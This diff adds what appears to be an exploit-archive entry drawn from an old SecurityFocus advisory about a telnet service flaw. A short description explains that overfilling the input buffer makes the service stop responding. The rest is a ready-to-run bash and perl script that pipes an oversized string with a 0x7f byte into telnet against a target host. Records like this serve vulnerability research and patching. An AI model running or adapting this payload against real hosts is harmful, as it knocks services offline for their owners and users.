@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/2838/info
+
+Due to a flaw in the implementation of the telnet service, it is possible for a remote client to perform a denial of service attack against a host.
+
+If approximately 4300 characters already exist in the input buffer and additional numerous specially chosen characters are provided, the service will stop responding. 
+
+#!/bin/bash
+  ( sleep 1
+    perl -e '{printf "%s\x7f%s","A"x4500,"A"x100}'
+    sleep 3
+  ) | telnet victimbox
+  - eof -
